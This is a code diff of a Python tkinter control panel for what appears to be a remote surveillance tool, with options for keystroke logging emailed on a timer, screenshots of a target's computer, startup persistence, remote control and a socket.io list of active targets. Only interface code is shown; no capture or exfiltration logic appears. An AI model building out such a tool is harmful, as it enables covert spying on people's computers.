@@ -1,15 +1,15 @@
 #
-# ..................................................................
+# ......................................................................................................................
 
 from tkinter import *
 from tkinter import ttk
 import silent
 
 
-def authorization_screen(users):
+def authorization_screen(sio):
 
-    global clients
-    clients = users
+    global socket_io
+    socket_io = sio
 
     # globalise username & password entries by user.
     global window
@@ -67,7 +67,7 @@ def authorization_screen(users):
     window.mainloop()
 
 
-# This function creates main interface screen.
+# ......................................................................................................................
 def main_screen():
     print('Welcome User !')
 
@@ -93,9 +93,12 @@ def main_screen():
     # set default value font.
     font_set = ('Helvetica', 8)
 
-    def logging_tab():
+# ......................................................................................................................
+    def tab_log():
+        print('')
 
-        def logging_module():
+# ......................................................................................................................
+        def module_logging():
 
             global tab_logging
 
@@ -112,7 +115,8 @@ def main_screen():
             row1_opt.pack(side=TOP, fill='x')
 
             # create and position a label to specify if the program should run automatically.
-            lbl_options_automatic_start = Label(row1_opt, font=font_set, text='Automatically run program on OS startup:')
+            lbl_options_automatic_start = Label(row1_opt, font=font_set,
+                                                text='Automatically run program on OS startup:')
             lbl_options_automatic_start.pack(padx=5, pady=5, side=LEFT)
 
             # create a check box to set the program to run automatically when operating system starts up.
@@ -145,10 +149,10 @@ def main_screen():
             btn_options_remove.pack(side=RIGHT, padx=15, pady=5)
 
         # run the function.
-        logging_module()
+        module_logging()
 
-        def keystroke_module():
-
+# ......................................................................................................................
+        def module_keystroke():
             # add an field set to provide key logging options for a program.
             keystrokes_frame = LabelFrame(tab_logging, font=font_frame, text='Keystrokes')
             keystrokes_frame.pack(fill='x', padx=4, pady=2)
@@ -157,7 +161,8 @@ def main_screen():
             row2_keystroke.pack(side=BOTTOM, fill='x')
 
             # add a slider to set the default time value of when the key stroking log should be sent.
-            scale_keystroke = Scale(row2_keystroke, font=font_set, orient='horizontal', from_=0, to=120, length=320, tickinterval=10)
+            scale_keystroke = Scale(row2_keystroke, font=font_set, orient='horizontal', from_=0, to=120, length=320,
+                                    tickinterval=10)
             scale_keystroke.pack(side=LEFT, padx=[25, 9])
 
             # add a button to control to turn on or off key stroke feature on targets computer.
@@ -168,14 +173,15 @@ def main_screen():
             row1_keystroke.pack(side=BOTTOM, fill='x')
 
             # add a label to tell how much minutes an user has set to sent the logs through an email.
-            lbl_keystroke_info = Label(row1_keystroke, font=font_set, text='Send an keystroke log every ')#+ str(scale_keystroke.get()) + ' minutes.')
+            lbl_keystroke_info = Label(row1_keystroke, font=font_set,
+                                       text='Send an keystroke log every ')
             lbl_keystroke_info.pack(side=LEFT, padx=5, pady=1)
 
         # run the function.
-        keystroke_module()
+        module_keystroke()
 
-        def screenshot_module():
-
+# ......................................................................................................................
+        def module_screenshot():
             # add an field set to provide screen shot options for a program.
             screenshot_frame = LabelFrame(tab_logging, font=font_frame, text='Screenshots')
             screenshot_frame.pack(fill='x', padx=4, pady=2)
@@ -184,7 +190,8 @@ def main_screen():
             row2_screenshots.pack(side=BOTTOM, fill='x')
 
             # add a slider to set the default time value of when the screen shots should be sent.
-            scale_screenshot = Scale(row2_screenshots, font=font_set, orient='horizontal', from_=0, to=120, length=320, tickinterval=10)
+            scale_screenshot = Scale(row2_screenshots, font=font_set, orient='horizontal', from_=0, to=120, length=320,
+                                     tickinterval=10)
             scale_screenshot.pack(side=LEFT, padx=[25, 9])
 
             # add a button to control to turn on or off screen shot feature on targets computer.
@@ -199,75 +206,76 @@ def main_screen():
             lbl_screenshot_info.pack(side=LEFT, padx=5, pady=1)
 
         # run the function.
-        screenshot_module()
+        module_screenshot()
 
     # run the function.
-    logging_tab()
+    tab_log()
 
-    def remote_control_tab():
+# ......................................................................................................................
+    def tab_remote_control():
 
-        global tab_remote_control
+        global remote_control
         global options_frame
 
         # create and position a remote control tab.
-        tab_remote_control = ttk.Frame(tab_control)
-        tab_control.add(tab_remote_control, text="   Remote Control   ")
+        remote_control = ttk.Frame(tab_control)
+        tab_control.add(remote_control, text="   Remote Control   ")
         tab_control.pack()
 
         # add an field set to provide remote control options for a program.
-        options_frame = LabelFrame(tab_remote_control, height=5, font=font_frame, text='Options')
+        options_frame = LabelFrame(remote_control, height=5, font=font_frame, text='Options')
         options_frame.pack(fill='x', padx=4)
 
-        def remote_control_module():
-
+# ......................................................................................................................
+        def module_remote_control():
             # add and position a label to specify the remote control status.
             lbl_start_remote = Label(options_frame, padx=2, font=font_set, text='Remote control: ')
-            lbl_start_remote.pack(side=LEFT, padx=[5,0])
+            lbl_start_remote.pack(side=LEFT, padx=[5, 0])
 
             # add a button to launch the remote control feature on or off.
             btn_start_remote = Button(options_frame, font=font_set, text='Turn on')
             btn_start_remote.pack(side=LEFT)
 
         # run the function.
-        remote_control_module()
+        module_remote_control()
 
-        def remote_control_display_module():
-
+# ......................................................................................................................
+        def module_remote_display():
             # add and position a label which indicates if the full screen mode is on or off.
             lbl_remote_control = Label(options_frame, padx=2, pady=10, font=font_set, text='Full screen mode: ')
-            lbl_remote_control.pack(side=LEFT, padx=[120,0])
+            lbl_remote_control.pack(side=LEFT, padx=[120, 0])
 
             # create a button to go full screen.
             btn_full_screen = Button(options_frame, font=font_set, text='Turn on')
             btn_full_screen.pack(side=LEFT)
 
             # add an field set to provide remote control options for a program.
-            display_frame = LabelFrame(tab_remote_control, height=250, font=font_frame, text='Display')
+            display_frame = LabelFrame(remote_control, height=250, font=font_frame, text='Display')
             display_frame.pack(fill='both', padx=4, pady=3)
 
-        remote_control_display_module()
+        module_remote_display()
 
     # run the function.
-    remote_control_tab()
+    tab_remote_control()
 
-    # think of a new feature to this program. ---------------
-    def extra_feature_tab():
+# ......................................................................................................................
+    def tab_extra_feature():
         tab_extra = ttk.Frame(tab_control)
         tab_control.add(tab_extra, text="   Extra Feature   ")
         tab_control.pack()
 
-    extra_feature_tab()
+    tab_extra_feature()
 
-    # this function runs a tab which contains information about the author and his project.
-    def about_project_tab():
+# ......................................................................................................................
+    def tab_about_project():
         tab_about = ttk.Frame(tab_control)
         tab_control.add(tab_about, text="    About    ")
         tab_control.pack()
 
-    about_project_tab()
+    tab_about_project()
 
-    def active_targets():
-
+# ......................................................................................................................
+    def target_list():
         # Field set to display the active target options.
         target_frame = LabelFrame(frame, height=100, font=('Helvetica', 9, 'bold'), text='ACTIVE TARGETS')
         target_frame.pack(side=TOP, fill='x', padx=[5, 0])
@@ -295,14 +303,35 @@ def main_screen():
 
         list_targets.config(yscrollcommand=scrollbar.set)
 
-        for client in clients:
-            list_targets.insert(END, client['name'])
+# ......................................................................................................................
+        socket_io.emit('get data')
 
-        # The button to connect to target's PC
+        @socket_io.on('list client')
+        def list_client(users):
+            print(users)
+
+            global clients
+            clients = users
+
+            list_targets.delete(0, END)
+
+            for client in clients:
+                list_targets.insert(END, client['name'])
+
+            socket_io.emit('get data')
+
+# ......................................................................................................................
         btn_connect_to_target = Button(target_frame, font=('Helvetica', 9, 'bold'), text='CONNECT')
         btn_connect_to_target.pack(side=BOTTOM, padx=5, pady=5, fill='x')
 
-    active_targets()
+        def disable_tabs():
+
+            for i in range(3):
+                tab_control.tab(i, state="disabled")
+
+        disable_tabs()
+
+    target_list()
     # execute main screen.
     frame.mainloop()
 
